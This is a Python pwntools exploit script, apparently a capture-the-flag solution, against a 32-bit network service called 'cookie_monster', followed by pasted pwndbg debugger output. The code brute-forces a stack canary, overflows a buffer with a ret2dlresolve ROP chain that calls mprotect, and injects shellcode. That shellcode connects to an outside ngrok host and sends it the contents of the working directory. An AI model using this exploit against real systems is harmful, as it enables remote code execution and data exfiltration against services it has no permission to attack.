#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit.basic import *
from time import sleep
import os


exe = context.binary = ELF("./cookie_monster")
host = args.HOST or "0.0.0.0"
port = int(args.PORT or 5555)

gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

libc = SetupLibcELF()


def get_canary():
    global io
    canary = b""
    while len(canary) < 4:
        for i in range(0xFF + 1):
            io = start()
            re()
            payload = b"admin123\n\x00" + b"A" * 502 + canary + chr(i).encode("latin-1")
            s(payload)
            if b"Come back soon" in re(timeout=1):
                canary += chr(i).encode("latin-1")
                break
            io.close()
    return payload, canary


# payload, canary = get_canary()
canary = 0xD201CB00
info(f"CANARY := {hex(canary)}")
# try:
# io.close()
# except:
# pass
# canary = p(0x448BB800)
# print(exe.sym)
io = start()
re()
pause()
context.log_level = "DEBUG"
bss = exe.bss(0x100 - 8)
rop = flat(
    [
        b"admin123\n\x00" + b"A" * 502,
        p(canary),
        0xDEADBEEF,
        0xDEADBEEF,
        0xDEADBEEF,
        exe.plt.write,
        0xDEADBEEF,
        0x4,
        0x804A00C,
        0x3C + 4,
    ]
)

bss = 0x804AEE0 - 0x30

ret2dl = Ret2dlresolvePayload(
    exe, symbol="mprotect", args=[0x804A000, 0x1000, 0x7], data_addr=bss
)
rop = ROP(exe)
rop.raw(rop.ret.address)
rop.ret2dlresolve(ret2dl)
a = [rop.chain(), ret2dl.payload]

rop = flat(
    [
        b"admin123\n\x00" + b"A" * 502,
        p(canary),
        p(0x8048A65),
        p(0x8048A65),
        p(0x8048A65),
        exe.plt.recv,
        p(0x8048A65),
        0x4,
        bss,
        0x400,
        0,
        0xCAFEBEBE,
        0xCAFEBEBE,
        0xCAFEBEBE,
        a[0].replace(b"daaa", p(0x804AEE0)),
    ]
)
pause()
s(rop)
pause()
copy_flag = b"\xcc"
# copy_flag = b"\x90"
copy_flag += asm(shellcraft.i386.linux.connect("4.tcp.ngrok.io", 17489))
copy_flag += asm("mov edi, edx")
copy_flag += asm(shellcraft.pushstr("./\x00"))
copy_flag += asm(
    """
	push esp
	mov ebx, esp
    mov eax, 0x05
    xor ecx, ecx
    xor edx, edx
    pop esp
    mov ebx, esp
    int 0x80
    push eax
    mov ebx, eax
    mov eax, 0x8d
    mov ecx, esp
    mov edx, 0x100
    int 0x80
    mov eax, 0x4
    mov ecx, esp
    mov ebx, edi
    mov edx, 0x100
    int3
    int 0x80
"""
)

s(a[1] + p(0) * 3 + b"\x90" * 50 + copy_flag)
io.interactive()
# io=start()
# re()
# rop = flat([
#
# b"admin123\n\x00" + b"A"*502,
# p(canary),
# 0xdeadbee1,
# 0xdeadbee2,
# 0xdeadbee3,
# gadget("pop ebx; ret"),
# bss,
# a[0]
# ])
# pause()
# s(rop)
# io.interactive()

"""
 ► 0x80487c3    call   recv@plt                     <recv@plt>
        fd: 0x4 (socket:[489507])
        buf: 0xffffcbcc ◂— 0x12
        n: 0x400
        flags: 0x0
 
   0x80487c8    add    esp, 0x10
   0x80487cb    mov    dword ptr [ebp - 0x24c], eax
   0x80487d1    sub    esp, 8
   0x80487d4    lea    eax, [ebp - 0x247]
   0x80487da    push   eax
   0x80487db    lea    eax, [ebp - 0x20c]
   0x80487e1    push   eax
   0x80487e2    call   strcmp@plt                     <strcmp@plt>
 
   0x80487e7    add    esp, 0x10
   0x80487ea    test   eax, eax
─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp 0xffffcb70 ◂— 0x4
01:0004│     0xffffcb74 —▸ 0xffffcbcc ◂— 0x12
02:0008│     0xffffcb78 ◂— 0x400
03:000c│     0xffffcb7c ◂— 0x0
04:0010│     0xffffcb80 —▸ 0xf7ffd000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x33f28
05:0014│     0xffffcb84 —▸ 0xf7d7e000 ◂— 0x464c457f
06:0018│     0xffffcb88 —▸ 0xffffcbf0 ◂— 0x12
07:001c│     0xffffcb8c ◂— 0x0
───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0x80487c3


*EAX  0x66
 EBX  0xa
 ECX  0xffffcb4c ◂— 0x4
 EDX  0x0
 EDI  0xffffcf5c —▸ 0xffffd162 ◂— 'SSH_AUTH_SOCK=/run/user/1000/keyring/ssh'
 ESI  0xf7fa6000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x227dac
 EBP  0xffffcdd8 —▸ 0xffffce78 ◂— 0x0
 ESP  0xffffcb40 —▸ 0xf7fd9bbd (_dl_fixup+13) ◂— add    ebx, 0x23443
*EIP  0xf7ea06b5 (recv+85) ◂— call   dword ptr gs:[0x10]
────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────
   0xf7ea06a0 <recv+64>     mov    eax, dword ptr [esp + 0x38]
   0xf7ea06a4 <recv+68>     mov    dword ptr [esp + 0x14], eax
   0xf7ea06a8 <recv+72>     mov    eax, dword ptr [esp + 0x3c]
   0xf7ea06ac <recv+76>     mov    dword ptr [esp + 0x18], eax
   0xf7ea06b0 <recv+80>     mov    eax, 0x66
 ► 0xf7ea06b5 <recv+85>     call   dword ptr gs:[0x10]
 
   0xf7ea06bc <recv+92>     mov    ebx, eax
   0xf7ea06be <recv+94>     cmp    eax, 0xfffff000
   0xf7ea06c3 <recv+99>     ja     recv+144                    <recv+144>
 
   0xf7ea06c5 <recv+101>    sub    esp, 0xc
   0xf7ea06c8 <recv+104>    push   edx
─────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp 0xffffcb40 —▸ 0xf7fd9bbd (_dl_fixup+13) ◂— add    ebx, 0x23443
01:0004│     0xffffcb44 —▸ 0x804a000 —▸ 0x8049f14 ◂— 0x1
02:0008│     0xffffcb48 ◂— 0x0
03:000c│ ecx 0xffffcb4c ◂— 0x4
04:0010│     0xffffcb50 —▸ 0xffffcbcc ◂— 0x12
05:0014│     0xffffcb54 ◂— 0x400
06:0018│     0xffffcb58 ◂— 0x0
07:001c│     0xffffcb5c ◂— 0x4d6cf000
───────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0xf7ea06b5 recv+85
───────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> 



0x080484d0  strcmp@plt
0x080484e0  bzero@plt
0x080484f0  __stack_chk_fail@plt
0x08048500  htons@plt
0x08048510  accept@plt
0x08048520  exit@plt
0x08048530  strlen@plt
0x08048540  __libc_start_main@plt
0x08048550  write@plt
0x08048560  bind@plt
0x08048570  fork@plt
0x08048580  listen@plt
0x08048590  socket@plt
0x080485a0  recv@plt
0x080485b0  close@plt
0x080485c0  send@plt
0x080485d0  __gmon_start__@plt

00000000  50 d4 f0 f7  e0 74 ef f7  f6 84 04 08  90 0f ec f7  │P···│·t··│····│····│
00000010  30 14 eb f7  26 85 04 08  00 e9 e3 f7  90 1d dd f7  │0···│&···│····│····│
00000020  f0 e6 e9 f7  b0 14 eb f7  e0 6f e7 f7  10 17 eb f7  │····│····│·o··│····│
00000030

"""
